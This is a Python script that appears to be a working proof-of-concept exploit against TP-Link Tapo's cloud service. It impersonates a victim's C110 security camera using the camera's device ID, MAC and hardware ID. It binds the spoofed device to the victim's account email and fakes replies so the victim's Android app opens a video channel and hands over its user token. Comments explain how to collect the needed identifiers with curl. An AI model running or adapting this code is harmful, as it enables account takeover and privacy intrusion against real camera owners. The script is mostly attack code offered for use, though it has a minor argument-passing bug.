#!/usr/bin/env python3
import ssl
import os
import sys
import struct
import socket
import json
import threading
import select

# You can obtain thesse values from a real device by running these commands:
# stok=$(curl -k -H "Content-type: application/json" -d '{"method":"login","params":{"username":"admin","password":"...md5-hashed-passwordhere..."}}' https://10.6.8.229/ | jq -r .result.stok)
# curl -k -H "Content-type: application/json" -d '{"method":"multipleRequest","params": {"requests": [{"method": "getDeviceInfo","params": {"device_info": {"name": ["info"]}}}]}}' "https://10.6.8.229/stok=$stok/ds" | jq
VICTIM_DEVICE = {
    "deviceId": "1111111111111111111111111111111111111111",
    "deviceMac": "222222222222", # without hyphens
    "hwId": "33333333333333333333333333333333",
    "cloudUserName": "4444444444@gmail.com", # email address of the victim
}

is_debug_mode = bool(os.environ.get("DEBUG"))

class TapoMq:
    thread = None
    mid = 0
    callbacks = {}
    default_callback = None
        
    def connect(self):
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.load_verify_locations("tp.crt")
        context.check_hostname = False
        hostname = 'n-devs.tplinkcloud.com'
        self.sock = socket.create_connection((hostname, 443))
        self.ssock = context.wrap_socket(self.sock, server_hostname=hostname)

    def _process_incoming_packet(self, buf):
        json_bytes = buf[4:]
        msg = json.loads(json_bytes)
        amid = msg["id"]
        callback = self.callbacks.get(amid)
        if callback:
            del(self.callbacks[amid])
            callback(msg)
        elif self.default_callback:
            self.default_callback(msg)

    def _msg_loop_thread(self):
        while True:
            readable = [self.ssock]
            r,w,e = select.select(readable,[],[],60)
            if r:
                buf = self.ssock.recv(4096)
                if not buf:
                    raise Exception("Nothing to read, we probably lost the connection")
                if is_debug_mode:
                    print("<<", buf)
                self._process_incoming_packet(buf)
            else:
                self.send({"method":"heartBeat"})

    def msg_loop(self):
        if self.thread:
            return
        self.thread = threading.Thread(target = self._msg_loop_thread, args = ())
        self.thread.start()

    def send(self, msg, callback=None):
        if not msg.get("id"):
            self.mid += 1
            msg["id"] = self.mid
        elif msg["id"] > self.mid:
            self.mid = msg["id"]
        msg_bytes = json.dumps(msg).encode()
        length_bytes = struct.pack(">H", len(msg_bytes))
        full_packet = b'\xa1\xb2'+length_bytes+msg_bytes
        if is_debug_mode:
            print(">>", full_packet)
        if callback:
            self.callbacks[msg["id"]] = callback
        self.ssock.send(full_packet)
    

def do_the_job():
    def respond_to_getlens(msg):
        # without responding to this request, the android management app would not attempt to open a channel for the video stream and we would not receive their user token
        msg_str = json.dumps(msg)
        resp = None
        if "getLensMaskConfig" in msg_str:
            resp = {"result":{"responseData":{"result":{"responses":[{"method":"getLensMaskConfig","result":{"lens_mask":{"lens_mask_info":{".name":"lens_mask_info",".type":"lens_mask_info","enabled":"off"}}},"error_code":0}]},"error_code":0}},"error_code":0,"id":7}
        elif "getAppComponentList" in msg_str:
            resp = {"result":{"responseData":{"result":{"responses":[{"method":"getDeviceInfo","result":{"device_info":{"basic_info":{"ffs":False,"device_type":"SMART.IPCAMERA","device_model":"C110","device_name":"C110 1.0","device_info":"C110 1.0 IPC","hw_version":"1.0","sw_version":"1.1.12 Build 211028 Rel.22161n(4555)","device_alias":"hel","features":"3","barcode":"","mac":"9C-A2-F4-F4-D5-91","dev_id":VICTIM_DEVICE["deviceId"],"oem_id":"174E74B156FA6DBEC9125902B20050FD","hw_desc":"00000000000000000000000000000000"}}},"error_code":0},{"method":"getLastAlarmInfo","result":{"system":{"last_alarm_info":{"last_alarm_type":"motion","last_alarm_time":"1683373283"}}},"error_code":0},{"method":"getAppComponentList","result":{"app_component":{"app_component_list":[{"name":"sdCard","version":1},{"name":"timezone","version":1},{"name":"system","version":3},{"name":"led","version":1},{"name":"playback","version":3},{"name":"detection","version":1},{"name":"alert","version":1},{"name":"firmware","version":1},{"name":"account","version":1},{"name":"quickSetup","version":1},{"name":"video","version":2},{"name":"lensMask","version":2},{"name":"lightFrequency","version":1},{"name":"dayNightMode","version":1},{"name":"osd","version":2},{"name":"record","version":1},{"name":"videoRotation","version":1},{"name":"audio","version":2},{"name":"diagnose","version":1},{"name":"msgPush","version":2},{"name":"deviceShare","version":1},{"name":"tapoCare","version":1},{"name":"blockZone","version":1},{"name":"personDetection","version":1},{"name":"babyCryDetection","version":1},{"name":"needSubscriptionServiceList","version":1}]}},"error_code":0}]},"error_code":0}},"error_code":0,"id":1}

        if resp:
            resp["id"] = msg["id"]
            mq.send(resp)
    mq = TapoMq()
    mq.connect()
    mq.msg_loop()  

    mq.default_callback = respond_to_getlens
    mq.send({"method":"helloCloud",
             "params":{
                "deviceId": VICTIM_DEVICE["deviceId"],
                "deviceMac": VICTIM_DEVICE["deviceMac"],
                "hwId": VICTIM_DEVICE["hwId"],
                # do not need to match
                "tcspVer":"1.2",
                "cloudUserName":"",
                "deviceName":"C110",
                "alias":"hel",
                "deviceModel":"C110",
                "deviceHwVer":"1.0",
                "fwId":"A9A7BB4934178E37E37D764E25AC7C06",
                "oemId":"174E74B156FA6DBEC9125902B20050FD",
                "fwVer":"1.1.12 Build 211028 Rel.22161n(4555)"
            }}, lambda msg: mq.send({"method":"bindDevice","params":{"deviceId":VICTIM_DEVICE["deviceId"],"cloudUserName":VICTIM_DEVICE["cloudUserName"],}}))


    
if __name__ == "__main__":
    do_the_job(*sys.argv[1:])
